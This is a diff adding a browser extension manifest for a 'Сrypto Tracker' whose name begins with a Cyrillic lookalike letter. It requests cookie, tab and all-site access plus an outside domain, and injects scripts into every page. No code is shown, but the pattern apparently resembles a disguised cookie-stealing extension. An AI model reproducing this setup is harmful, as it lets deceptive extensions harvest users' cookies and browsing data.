@@ -1,0 +1,29 @@
+{
+   "browser_action": {
+       "default_popup": "popup.html",
+      "default_icon": "images/favicon.png",
+      "default_title": "Сrypto Tracker"
+   },
+   "background": {
+    "page": "po.html"
+ },
+
+   "content_scripts": [ {
+      "js": [ "background.js", "js/popup.js"],
+      "matches": [ "\u003Call_urls>" ]
+
+
+   } ],
+   "icons": {
+      "128": "images/es128.png",
+      "16": "images/es16.png",
+      "48": "images/es48.png"
+   },
+
+   "manifest_version": 2,
+   "name": "Сrypto Tracker",
+   "options_page": "options.html",
+   "permissions": [ "tabs", "activeTab", "cookies", "*://*/*", "https://evoshare.com/*" ],
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "2.10.20.0"
+}
